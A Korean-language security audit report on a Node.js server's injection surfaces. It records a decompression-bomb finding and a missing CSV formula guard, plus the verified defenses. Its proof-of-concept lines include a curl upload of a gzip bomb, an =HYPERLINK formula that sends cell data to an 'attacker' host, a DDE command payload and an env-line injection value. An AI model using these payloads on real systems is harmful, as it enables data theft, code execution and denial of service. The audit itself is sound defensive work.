# 감사 02 — 명령/인자 주입 · 경로 이탈 · 아카이브 · SQL · CSV/헤더 주입 (읽기 전용, 2026-09-12)

> 대상: `/home/claude/the.dvc/server/src` (코드 미수정). 방식: `child_process`·`withSsh` exec 전수(약 120 지점),
> `path.join/resolve` 요청 유래 지점, `upgrade/archive.js`·`backup/service.js`, SQLite `prepare/exec` 템플릿
> 문자열(단일·다중 행), `Content-Disposition`·CSV 빌더 전수 확인. 직전 감사(2026-08-09, 08-17)에서 수정된
> 항목은 **회귀 여부만** 확인하고 재보고하지 않았다. 확정 기준: 코드로 재현 경로를 확인한 것만.
> 확인하지 못한 세부는 '추정'으로 표기.

## 요약

| 심각도 | 건수 | 내용 |
|---|---|---|
| Critical / High / Medium | **0** | 인증 없는(또는 viewer/operator 수준의) 명령·경로·SQL 주입 경로 없음 |
| Low | 2 | L-1 업그레이드 아카이브 압축 폭탄(gunzip 출력 상한 부재), L-2 중계 토폴로지 CSV 수식 가드 누락 |
| Info(설계 수용/일관성) | 2 | I-1 프록시 자동배포 커스텀 명령 원문 실행(admin 설계), I-2 배포 대상 env 값 개행 미검증(admin 동일 경계) |

이번 범위에서 **가장 중요한 결론은 "회귀 없음"** 이다 — 이전에 고친 L-3(XLSX 폭탄)·L-R2(CSV 수식)·L-R7(fetchPackage
경로 이탈)·S1(installerPath 실경로 봉쇄)·H16(installDir/watchDir 허용 베이스)은 모두 현행 코드에 남아 있다.

---

## 확정 발견

### L-1 [LOW · CWE-409] 업그레이드 번들 압축 해제에 출력 상한이 없어 압축 폭탄으로 메모리 고갈(DoS)

- **위치**
  - `server/src/upgrade/archive.js:63` — `return parseTar(isGzip ? zlib.gunzipSync(buf) : buf);`
  - `server/src/upgrade/archive.js:102` — `else if (method === 8) data = zlib.inflateRawSync(comp);`
  - `server/src/upgrade/upgrade.js:84` — 크기 상한(`MAX_BUNDLE_BYTES`=200MB, `MAX_MEMBERS`)은 `collectMembers` 에서
    **압축 해제가 끝난 뒤** 누적 합으로만 검사한다.
  - `server/src/routes/upgrade.js:188` — `express.raw({ …, limit: '256mb' })` (본문 상한이 `MAX_BUNDLE_BYTES` 보다 크다).
- **코드**: `MAX_BUNDLE_BYTES`/`MAX_MEMBERS` 는 주석대로 "zip/tar bomb 가드"를 의도했지만, `gunzipSync`·`inflateRawSync` 에
  `maxOutputLength` 가 없어 실제 팽창 자체는 제한하지 못한다. tar 는 gzip 스트림 전체를 먼저 메모리에 펼치고, zip 은
  엔트리마다 전량 inflate 한 뒤 `collectMembers` 가 합계를 본다.
- **공격 전제**: 엣지 포탈의 **admin 세션**(`POST /api/upgrade/bundle` 은 `adminOnly`) 또는 감시 폴더/원격 미러에
  번들을 놓을 수 있는 위치. `X-Bundle-Sha256` 은 송신자가 계산해 보내는 값이라 무결성 확인이지 인증이 아니다(공격자가
  자기 번들의 sha 를 넣으면 통과). `/api/collector/upgrade`(`routes/collector.js:200`, 256mb raw) 도 같은 `upgradeFromBundleBytes`
  경로로 보이나 핸들러 본문은 이번에 읽지 않았다(**추정**).
- **PoC**: 0 바이트로 채운 tar(예: 8GB)를 gzip 하면 ≈8MB. `curl -X POST -H 'Content-Type: application/gzip' -H "X-Bundle-Sha256: $(sha256sum bomb.tgz)" --data-binary @bomb.tgz https://edge/api/upgrade/bundle` →
  `gunzipSync` 가 8GB 버퍼를 할당하려다 힙/RSS 고갈 → 프로세스 OOM(systemd 재기동). Node 22 의 `buffer.constants.MAX_LENGTH`
  는 2^53-1 로 상향돼 4GB 예외로 조기 실패하지 않는다(**추정** — 번들 Node 버전 기준).
- **심각도 근거**: admin 전제 + 가용성 한정이라 Low. 다만 이 코드는 중앙·엣지·수집기 3곳이 공유하므로 한 번에 닫힌다.
- **수정안**
  1. `zlib.gunzipSync(buf, { maxOutputLength: MAX_BUNDLE_BYTES })`, `zlib.inflateRawSync(comp, { maxOutputLength: MAX_BUNDLE_BYTES - total })`
     — 초과 시 `ERR_BUFFER_TOO_LARGE` 로 즉시 실패(`failed to read bundle` 로 정리됨).
  2. `parseTar` 에서 헤더 `size` 누적을 `MAX_BUNDLE_BYTES` 로 사전 검사(엔트리 루프 안에서).
  3. `express.raw` limit 을 `MAX_BUNDLE_BYTES` 이하로 맞춘다(현재 256mb > 200MB).

### L-2 [LOW · CWE-1236] 중계 토폴로지 CSV 내보내기에 수식 인젝션 가드 누락(2026-08-09 L-R2 정책 미적용 잔여)

- **위치**: `server/src/relaytopo/store.js:169`
  ```js
  const q = (v) => { const s = String(v ?? ''); return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s; };
  ```
  → `routes/api/relaytopo.js:79` `GET /tools/relaytopo/export?format=csv`(adminOnly) 가 그대로 전송.
- **코드**: 따옴표 처리만 있고 `= + - @` 선행 셀에 `'` 접두가 없다. 같은 저장소의 다른 11개 CSV 빌더(`storage/csv.js`,
  `pdu/csv.js`, `bmstor/csv.js`, `agent/deployCsv.js`, `collector/csv.js`, `idrac/scanRangesCsv.js`, `svcmon/csvio.js`,
  `svcmon/templatesCsv.js`, `guestdisk/service.js reclaimCsv`, `routes/admin/opsSettings.js`, `routes/api/{ipamExport,hardwareGpu,checksLogs}.js`)
  는 `util/csv.js guardCell`/`csvLine` 또는 동등한 인라인 가드를 쓴다 — 이 파일만 누락.
- **공격 전제**: 토폴로지를 편집·가져오기 할 수 있는 **admin**(`POST /tools/relaytopo/import` adminOnly). 즉 admin 이
  다른 admin 의 워크스테이션을 겨냥하는 시나리오라 Low.
- **PoC**: 사이트 `note`(또는 `dc`) 에 `=HYPERLINK("http://attacker/"&A1,"open")` 또는 `=cmd|' /C calc'!A0` 저장 →
  다른 admin 이 CSV 내보내기 → Excel 이 DDE/HYPERLINK 를 평가.
- **수정안**: `q` 를 `util/csv.js csvLine`(또는 `guardCell` 후 quoting)으로 교체. 회귀 테스트는 `test/` 의 기존 CSV
  가드 테스트에 `topologyToCsv` 케이스 추가.

---

## 정보(설계상 수용 — 경계 초과 없음, 기록만)

### I-1 [INFO · CWE-78] 프록시 자동배포의 `validateCmd`/`reloadCmd`/`haproxyConfigPath` 원문 셸 실행
- `server/src/proxy/deploy.js:62` `const validate = (deploy.validateCmd || 'haproxy -c -f {file}').replace('{file}', tmpPath); await exec(validate);`,
  `:72` `await exec(deploy.reloadCmd || 'systemctl reload haproxy')`, `:65,70,71,88` `cfgPath` 를 따옴표 없이 `rm -f`/`cp -a`/`mv`/`test -r` 에 삽입.
- 값은 `proxy/registry.js:161` `saveProxy` 가 `body.deploy` 를 병합하며(형식 검증 없음) 저장 → `routes/remote.js:134 POST /remote/proxies` 는 `adminOnly`.
- 판정: "커스텀 검증/리로드 명령"이 기능 자체이고, 같은 admin 이 그 호스트의 SSH 자격증명(root)을 함께 등록하므로 **권한 상승이
  아니다**. 다만 `haproxyConfigPath` 에 공백/`;` 이 들어가면 백업·교체 단계가 깨져 cfg 유실 사고로 이어질 수 있으니 경로
  화이트리스트(`/^\/[A-Za-z0-9._/-]{1,200}$/`, `rma/deploy.js RE_PATH` 와 동일)만이라도 권장.

### I-2 [INFO · CWE-74] 배포 대상 env 값(agentName·collectorDatacenter·advertiseUrl 등) 개행 미검증 → portal.env 줄 주입
- `server/src/agent/deploy.js:191-192` — `block.replace(/'/g, "'\\''")` 로 **셸 인용은 안전**하지만, 값의 `\n` 은 그대로
  `printf '%s'` 를 통해 원격 `portal.env` 에 새 줄로 기록된다(예: `AGENT_NAME=x\nUPGRADE_ALLOW_UNVERIFIED=true`).
- `agent/deployRegistry.js saveTarget`(69행~)에는 `FIELDS` 복사만 있고 값 정규식이 없다(**추정** — 파일 내 `test(`/정규식 부재를 grep 으로 확인,
  CSV 가져오기 경로 `agent/deployCsv.js` 는 미확인). 대조: `rma/deploy.js:23 RE_ENV_VALUE` 는 같은 패턴을 막는다.
- 판정: 실행 주체는 그 호스트의 root SSH 자격증명을 등록한 **admin** 이라 경계 초과 없음. 일관성 차원에서 `RE_ENV_VALUE`
  동일 적용 권장(`deployInputIssue` 와 같은 순수 검증 함수로).

---

## 확인된 양호한 방어 (파일 근거)

**로컬 `child_process` — 전부 argv 배열 + 호스트 화이트리스트, 셸 미경유**
- `util/ping.js:17,64` `SAFE=/^[A-Za-z0-9._:][A-Za-z0-9._:-]*$/` + `execFile('ping', args)`; `ipam/scan.js:144,149,191` `isIpv4` 선검사 + `execFile`.
- `svcmon/checker.js:292-301` `SAFE_HOST` + `host.startsWith('-')` 이중 차단 + `execFile(traceroute, [...])`.
- `system/nfsMounts.js:33-35,52-58` `RE_SERVER`(선행 `-` 불가)·`RE_EXPORT`(`..` 금지)·`RE_OPTIONS` + 옵션 토큰 선행 `-` 거부, `execFile('mount', args)`; 마운트 지점은 `id` 를 `[^A-Za-z0-9_-]` 제거 후 `BASE` 하위 고정(`:63`).
- `hostaccess/exec.js:16,28,30` `spawn(cmd, args)` 고정 바이너리(`/usr/bin/firewall-cmd`, `systemctl {verb} sshd.service`) + `SAFE_ENV`; 인자는 `render.js` 의 CIDR/포트 정규식(`:26,:76`) 산출물만.
- `rma/exec.js:114-116` 프리셋 argv spawn(`detached`, 출력 상한, SIGTERM→SIGKILL), 자유 명령은 `spec.shell` 일 때만 `/bin/sh -c`; `rma/commands.js:23-36` 파라미터 타입별 정규식(`RE_HOST/UNIT/PATH/URL/TEXT/int`), `:248` 조립 후 **모든 인자 선행 `-` 재검사**, `:216` `custom` 은 `allowCustom`(엣지 env) 필수. `rma/testRunner.js:22-25` 파일 점검은 `realpathSync` 기준 `RMA_FILE_ROOTS` 하위만.
- `upgrade/upgrade.js:276` `spawn(process.execPath, process.argv.slice(1))` — 외부 입력 없음.

**SSH 원격 명령 조립 — 화이트리스트 후 삽입, 원격 출력도 재검증**
- `net/tcpdump.js:12-13,92-99,159-173` `PEERRE`·`IFRE`(선행 `-` 차단), `sec/max` 숫자 클램프, pcap 파일명 `randomBytes` 포함.
- `routes/remote.js:52,80,93,95` `SAFE_HOST` 로 `'`/공백/메타문자 배제 → `bash -c '</dev/tcp/…'` 인용 안전, 포트 숫자 클램프; `proxy/registry.js:200-210 addMapping` 은 `SAFE_TARGET_HOST` + name 의 CR/LF/TAB 제거(haproxy.cfg 줄 주입 차단).
- `bmstor/collect.js:13,19-27` `MOUNT_RE=/^\/[A-Za-z0-9._\/-]*$/` + 길이 256 → `df -P -k -- …`.
- `rma/deploy.js:20-24,55-68,70-76` 인스턴스명/경로/계정/env 값/URL 정규식, `systemctl show` 출력(`prefix/user/envFile`)을 **재검증 후** 사용, `printf '%s' '…'` 의 `'` 이스케이프.
- `agent/deploy.js:19,28-35` `INSTALLER_RE` + `realpathSync` 허용 디렉터리 검사(S1 유지), `:164` 포트 정수 강제, `:270-279` `ps -o unit=`·`EnvironmentFiles` 출력 정규식 재검증 + `portalUnitAllowed`, `:294` 토큰 문자셋 제한.
- `relaytopo/ops.js:17,73,209-224` 경로 상수(`CFG`)·ISO 타임스탬프 파일명·cfg 본문은 base64 로 전달(`printf '%s' '<b64>' | base64 -d`), 백업 `set -e`+종료코드 분리(S5), `isActiveOut` 정확 비교(I1) 유지; `resolveNodeAccess:35` `ipBlockReason`.
- `sanswitch/collectors/fosSsh.js:63,69-73` 원격 `$PATH` 출력을 `SAFE_DIR` 로 걸러서만 `ls` 에 삽입; `sanswitch/registry.js:69,87,113` `vfId` 1~128 정수 강제 → `setcontext ${Number(vfId)}`.
- `storage/collectors/cliSsh.js:47-52`·`isilonSsh.js:204-207`·`gpu/sshCollect.js:20-25`·`pdu/parse.js:85-92`(`int(id)`) — 명령이 코드 상수, 장비 필드는 접속 정보(host/port/user/pw)로만 쓰이고 명령 문자열에 들어가지 않음.
- `llm/ollamaDeploy.js:80` 모델명 `replace(/[^\w.:/-]/g,'')`, `:45` 로컬 tgz 는 SFTP 전송(경로는 admin 입력이나 `existsSync` 후 `putFile` 만).

**경로 이탈**
- `routes/dlsource.js:23,33-36,80-83` `SAFE_RE=/^[\w.+-]+\.(tar\.gz|zip)$/`(구분자 불가) + `isFile()`; `res.download(p, basename)`.
- `backup/service.js:78-91,112-123` `path.basename` + `portal-backup-…json.gz` 정규식, 복원은 `basename` + `.json/.env` 확장자 화이트리스트 + `DENY_NAMES` + `atomicWriteFileSync`. 라우트 전부 `adminOnly + requireSettingsOwner`(`routes/admin/backupNetSec.js:40-66`). 업로드 복원 라우트는 존재하지 않음(`parseUploadedArchive` 호출부 없음).
- `svcmon/csvlog.js:231-237 logFilePath` 정규식 + `path.resolve` 후 `dirname===base` 재확인; `routes/svcmon/logs.js:37-43` 은 이 결과가 있을 때만 `Content-Disposition` 에 같은 이름 사용(정규식 통과 값이라 `"`·CRLF 불가).
- `upgrade/fetchPackage.js:58-61,85` `basename === fname` + 확장자 화이트리스트(L-R7 유지); `upgrade/upgrade.js:69-76 acceptMember`(`..` 거부, `<pkg>/` 하위만) + `:135` 스테이징 `startsWith` 이중 검사 + tar 심볼릭/하드링크는 `type==='file'` 만 수용(`archive.js:54-55`); `downloadArchive:372-373` `ARCHIVE_RE` 로 파일명 고정.
- `routes/upgrade.js:25-52,69-73` `installDir/watchDir` 절대경로·`..`·제어문자 거부 + 허용 베이스(H16 유지).
- `routes/admin/backupNetSec.js:73-80` vclogs `storagePath` 검증(v2.480 S4 유지); `svcmon/logsettings.js:60-71` 로그 경로는 쓰기 시험·디렉터리 확인; `insights/dbLocation.js:115-176 preflight` 제어문자·인용부호·`$`·백틱 거부 + 하위경로/시스템 경로 차단(스크립트는 생성만, 서버가 실행하지 않음 — `routes/admin/statusTools.js:136`).
- `index.js:187-208` 정적 서빙은 `express.static` + SPA 폴백 `sendFile(path.join(webDist,'index.html'))` 고정.

**아카이브/가져오기**
- XLSX 가져오기 L-3 조치 유지: `routes/svcmon/shared.js:22 XLSX_MAX_BYTES=8MB`(`transfer.js:116,172` 413) + `svcmon/formats.js:81-98 XLSX_MAX_ROWS/COLS`.
- CSV 파서 `util/csv.js:46-` `maxRows/maxCell` 스캔 중 검사(전량 파싱 전 중단).
- 번들 무결성: `upgrade.js:382-393,429-439` sha256 부재 fail-closed(`UPGRADE_ALLOW_UNVERIFIED` 만 예외), 엣지 수신 `bundleShaIssue` 검증(v2.480 유지).

**SQLite**
- 동적 SQL 조각 전수 확인 결과 변수 삽입은 ① 코드 상수(테이블/컬럼: `ipam/db.js:65,69`, `vmtrack/db.js:122,125`, `pdu/db.js:123,203`), ② `?` 플레이스홀더 개수(`logs/db.js filterSql`, `guestdisk/db.js:158,197`, `sanswitch/perfDb.js:91,100,201,319`, `pdu/db.js:143,157`), ③ 서버가 계산한 정수(`bucketMs`: `perfDb.js:188`, `pdu/db.js:131` `Math.round`) 뿐. 사용자 문자열은 전부 바인딩(`LIKE ?` 포함). 동적 `ORDER BY` 없음.

**로그/헤더/리다이렉트**
- `audit.js:55-57` 감사로그는 JSON Lines(`JSON.stringify`) — 개행/구분자 주입 불가.
- `Content-Disposition` 40여 지점 전수: 날짜/상수/화이트리스트 값(`hardwareGpu.js:100 range` 는 `'days'|'all'`, `ipamExport.js:89` `encodeURIComponent`, `remote.js:280` `[^\w.-]→_`, `svcmon/transfer.js` `FORMAT_META[format].ext`) 만 사용. `res.redirect` 사용처 없음.
- CSV 수식 가드: `util/csv.js:86 guardCell`/`:113 csvLine` 이 위 12개 빌더에 적용(L-R2 유지). 누락은 L-2 한 곳.

---

## 미확인/범위 밖(다음 감사 후보)
- `routes/collector.js:200` `/api/collector/upgrade` 핸들러 본문(토큰 종류·sha 검증 순서) — L-1 과 같은 코드 경로로 추정되나 미열람.
- `agent/deployCsv.js` 가져오기의 값 정규화(I-2 관련) 미열람.
- `agent/bulkDeploy.js`·`pdu/poller.js`·`util/smtp.js` 는 `withSsh` 참조만 확인(명령 조립은 각각 `agent/deploy.js`·`apcSsh.js` 재사용으로 판단, 직접 exec 문자열 없음 — grep 기준).
